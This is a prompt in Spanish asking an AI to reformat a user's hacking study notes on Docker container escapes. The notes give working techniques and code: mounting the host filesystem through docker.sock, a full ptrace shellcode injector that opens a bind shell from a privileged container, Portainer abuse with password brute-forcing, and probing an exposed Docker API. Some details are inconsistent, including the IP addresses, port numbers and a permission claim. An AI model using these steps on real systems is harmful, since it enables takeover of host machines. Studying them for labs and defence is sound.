
Quiero que actúes como un asistente especializado en mejorar y embellecer mis apuntes de **hacking y ciberseguridad** en Obsidian.

### Reglas de formato:
- Usa **Markdown** y todas las herramientas nativas de Obsidian:  
  - Encabezados jerárquicos (#, ##, ###…)  
  - Negritas, cursivas, tachado  
  - Listas ordenadas y no ordenadas  
  - Tablas para comparaciones  
  - Callouts (`> [!info]`, `> [!tip]`, `> [!warning]`, `> [!example]`, etc.)  
  - Diagramas con **Mermaid** (especialmente diagramas de redes, flujos y ataques)  
  - Bloques de código y comandos de terminal (bash, python, etc.)  
  - Separadores `---` para estructurar  

### Reglas de estilo:
- Embellecé y organizá mis notas para que sean **claras, fáciles de leer y visualmente atractivas**.  
- Si algo está enredado o difícil de entender, simplificalo y hacelo **más didáctico**.  
- Agregá **ejemplos prácticos** (comandos reales, simulaciones, casos de uso).  
- Respetá los **enlaces e imágenes** que yo incluya. No borres ni inventes enlaces/imágenes nuevas.  
- Podés usar **diagramas de red (Mermaid), tablas comparativas y listas de pasos** para explicar ataques, defensas y herramientas.  
- El resultado final debe ser un apunte **técnico, claro y útil para estudiar hacking**.  

Cuando te pase un texto, transformalo siguiendo estas reglas.

Aqui te va el texto:

---

# Docker Breackout

explicar teoria...



cuanod por ejemplo se hace docker ps o docker images
hay un unix socket file ubicado en ->  /var/run/docker.sock

es de file: socket
se comunica con el demonio de docker

---

vamos a ver un caso aplicado con este socket

supongamos que un contenedor se ejecuta esto.

docker run --rm -dit -v /var/run/docker.sock:/var/run/docker.sock --name ubuntuServer

suponemos que el contenedor ubuntuServer es el contenedor secuestrado luego de haber explotado alguna vulnerabilidad. sabiendo que el socket que tiene es el socket de la "maquina real" 

si efectuamos un docker images dentro de ubuntuServer vamos a ver la imagen "ubuntu" la imagen que se uso para crear ubuntuServer

por lo que podriamos dentro de este contenedor ubuntuServer armar otro contenedor y jugar con monturas tambien metiendo la carpeta el directorio raiz dentro de /mnt/root

docker run --rm -dit -v /:/mnt/root --name privesc ubuntu

y aca esta la cosa: el / es el root del host real o maquina real. no del contenedor ubuntuServer

si hacemos un docker exec -it privesc bash
cd /mnt/root

si hacemos chmod u+x /mnt/root/bin/bash

estariamos modificando el binario bash del host real poniendole permisos de ejecucion al usuario root



----

otro caso

contenedor con la flag --pid=host
tambien con --privileged el cual habilita todas las capabilities

si tienes acceso a listar las capabilities con capsh --print

sino puedes instalarlo con apt install libcap2-bin

suponiendo que sabes o descubriste lo de --pid=host y --privileged

puedes listar los procesos

ps -faux


cuando tenemos este tipo de casos que por ejemplo tenga un contenedor con --pid=host si el host tiene un proceso corriendo con privilegios de root por ejemplo python -m http.server 80 lo vamos a poder ver y utilizar a nuestro favor, esto con cuaquier proceso que este corriendo como root

la idea es poder inyectar shellcode instrucciones de bajo nivel maliciosas en el proceso que este corriendo como root, el cual permita crear un subproceso por el cual ejecute un comando

podemos ver este repositorio
https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c

especificamente este codigo infect.c

en este caso el shellcode lo ajustamos para que nos permita entablar una [[Bind Shell]] dejando un puerto 5600 abierto y luego con [[netcat]] ponerneos en escucha y conectarnos a ese puerto

existe en exploitdb un script que tiene ese shellcode. 

```c
 sh[]="\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";

```
lo ajustamos a nuestro codigo infect.c y nos quedaria asi

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 32

unsigned char *shellcode =  "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";


int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);

  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }

  printf ("+ Waiting for process...\n");
  wait (NULL);

  printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  

  /* Inject code into current RPI position */

  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);

  regs.rip += 2;
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);

  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");

 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
  return 0;
}
```

tener en cuenta que el contenedor necesitamos tener instalado gcc y libcap2-bin netcat nano

con apt update && apt install gcc libcap2-bin netcat nano -y

luego compilamos

gcc infect.c -o infect

y ejecutamos

buscamos un proceso corriendo como root por ejemplo supongamos que un proceso python -m http.server 80 tiene el pid 1234

./infect 1234

luego ya estaria escuchando el host en el puerto 5600 pero primero

la ip del contenedor -> hostname -I -> 172.17.0.2
la ip del host -> por consecuencia seria 172.17.0.1

en el contenedor obviamente

nc 172.17.0.1 5600
nos devuelve la consola interactiva


ahi ya puedes hacer el [[Tratamiento de TTY]]


---

otra forma de escapar del contenedor

contexto. ves un servicio [[portainers]] corriendo en el host

por si quieres crearlo

```bash
docker run -dit -p 8000:8000 -p 9000:9000 --name portainer --restart=allways -v /var/run/docker.sock:/var/run/docker.sock -v /docker/portainer/data:/data portainer/portainer-ce
```

en la maquina victima obviamente estaria en ese caso corriendo en el puerto 9000

ojo, las nuevas versiones de portainers pide contraseña mas robusta pero si es una version vieja o sabes la contraseña
puedes aprovechar el uso de fuerza bruta ya que las personas suelen gestionar mal sus contraseñas

desde portainer puedes crear un contenedor que tenga -v /:/mnt/root y que te otorgue una consola interactiva tty

---
otra forma de escapar del contenedor :  abusando de la api de docker

no existe /var/run/docker.sock
tampoco existe --pid=host ni --privileged

la api opera por el puerto 2375 http o 2376 https (tls)

 ojo alguien tuvo que haber configurado el uso de las api de docker, para verificar eso puedes usar [[netstat]]
netstat -nat

si quieres simularlo puedes habilitar la api de docker aqui
	[[Docker - Habilitar la TCP puerto 2765]]
	una vez habilitado le das
	docker run -dit --name nombre imagen
	docker exec -it nombre bash


si te encuentras en este contexto, dentro del contenedor y quieres escaparlo y tienes [[jq]] o [[curl]] o ambos

en cualquier caso se sabe que si tu ip por ejemplo

```bash
$ hostname -I
192.17.0.2
```

tu ip del host es
```bash
192.17.0.1
```

en este caso es interesante buscar por si en el host esta abierto el puerto 2375

```bash
echo "" > /dev/tcp/197.17.0.1/2375
```

podrias printear el codigo de estado 
```bash
echo $? 
```
si devuelve 0 esta abierto

